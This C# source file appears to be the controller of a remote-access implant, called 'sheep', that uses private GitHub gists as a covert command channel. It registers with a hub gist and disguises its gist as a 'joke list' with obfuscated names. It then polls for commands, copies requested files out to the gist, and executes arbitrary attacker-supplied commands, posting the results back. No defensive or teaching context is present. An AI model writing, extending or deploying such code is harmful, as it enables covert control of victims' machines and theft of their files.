using Octokit;
using Pasture;
using Pasture.Messages;

namespace Sheep.Core;

public class SheepController
{
    private GitHubClient _client;
    private GistComment? _startingComment;
    private string? _gistId;

    private Timer _heartBeatTimer;

    private const string HubGistId = "<HUB_GIST_ID>";
    private const string GithubToken = "<GITHUB_TOKEN>";

    public string SheepId { get; private set; }

    private IDictionary<int, GistComment> _processedComments = new Dictionary<int, GistComment>();

    public SheepController(string sheepId)
    {
        SheepId = sheepId;
        _client = ConnectGitHubClient();
    }

    private void SendHeartBeat(object? state)
    {
        var message = new HeartBeatMessage(DateTimeOffset.UtcNow);
        _client.Gist.Comment.Create(_gistId, message.GetTransportFormat());
    }

    private GitHubClient ConnectGitHubClient()
    {
        var client = new GitHubClient(new ProductHeaderValue($"sheep"));
        var tokenAuth =
            new Credentials(GithubToken);
        client.Credentials = tokenAuth;

        return client;
    }

    public async Task Start()
    {
        //Try to find existing hub gist
        var comments = await _client.Gist.Comment.GetAllForGist(HubGistId);

        foreach (var comment in comments)
        {
            if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage) &&
                assignmentMessage.SheepId == SheepId)
            {
                _gistId = assignmentMessage.GistId;

                _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
                return;
            }
        }

        //Create new gist if not existing
        var newGist = new NewGist()
        {
            Public = false,
            Description = $"Joke list id: {SheepId}"
        };
        newGist.Files.Add(Obfuscator.RandomGistName(), Obfuscator.RandomGistDescription());

        var gist = await _client.Gist.Create(newGist);
        _gistId = gist.Id;

        _startingComment =
            await _client.Gist.Comment.Create(HubGistId,
                new AssignmentMessage(SheepId, _gistId).GetTransportFormat());

        _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
    }

    public async Task TryReceiveMessage()
    {
        var comments = await _client.Gist.Comment.GetAllForGist(_gistId);

        foreach (var comment in comments)
        {
            if (CommandMessage.TryParse(comment.Body, out var commandMessage) && !commandMessage.Answered)
            {
                await ProcessMessage(commandMessage, comment.Id);
            }
        }
    }

    private async Task ProcessMessage(CommandMessage commandMessage, int commentId)
    {
        string response;
        ResponseMessage responseMessage;

        switch (commandMessage.Type)
        {
            case CommandType.W:
                response = await CommandExecutor.ExecuteCommandW();
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Ls:
                response = await CommandExecutor.ExecuteCommandLs(commandMessage.Parameters);
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Id:
                response = await CommandExecutor.ExecuteCommandId();
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Cp:
                var filePath = commandMessage.Parameters;
                int pos = filePath.LastIndexOf("/", StringComparison.Ordinal) + 1;
                var fileName = filePath.Substring(pos, filePath.Length - pos);
                var fileContent = await CommandExecutor.ExecuteCommandCopy(filePath);

                responseMessage = new ResponseMessage(commentId, commandMessage.Type, fileContent);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Execute:
                response = await CommandExecutor.ExecuteCommand(commandMessage.Parameters);
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            default:
                throw new ArgumentOutOfRangeException();
        }

        commandMessage.Answered = true;
        await _client.Gist.Comment.Update(_gistId, commentId, commandMessage.GetTransportFormat());
    }
}